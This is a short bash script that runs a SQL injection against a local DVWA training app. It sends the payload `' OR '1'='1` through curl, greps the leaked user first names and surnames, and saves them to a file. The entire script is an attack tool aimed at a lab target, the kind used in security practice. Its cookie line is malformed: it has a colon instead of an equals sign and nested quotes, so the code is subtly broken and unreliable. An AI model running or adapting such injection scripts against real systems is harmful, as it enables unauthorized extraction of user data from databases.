#!/bin/bash
# Simple SQLi exploitation using curl

URL="http://127.0.0.1/DVWA/vulnerabilities/sqli/"
COOKIE="security=low; PHPSESSID:"bc84851762ecba3af9428a0bc1adabd2""
OUTPUT_FILE="sqli_output.txt"

echo "[+] Exploiting SQL Injection on DVWA (Low Security)..." | tee "$OUTPUT_FILE"

curl -s -X GET "${URL}?id=1' OR '1'='1&Submit=Submit#" \
     -H "Cookie: $COOKIE" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     | grep -i "Surname\|First name" | tee -a "$OUTPUT_FILE"
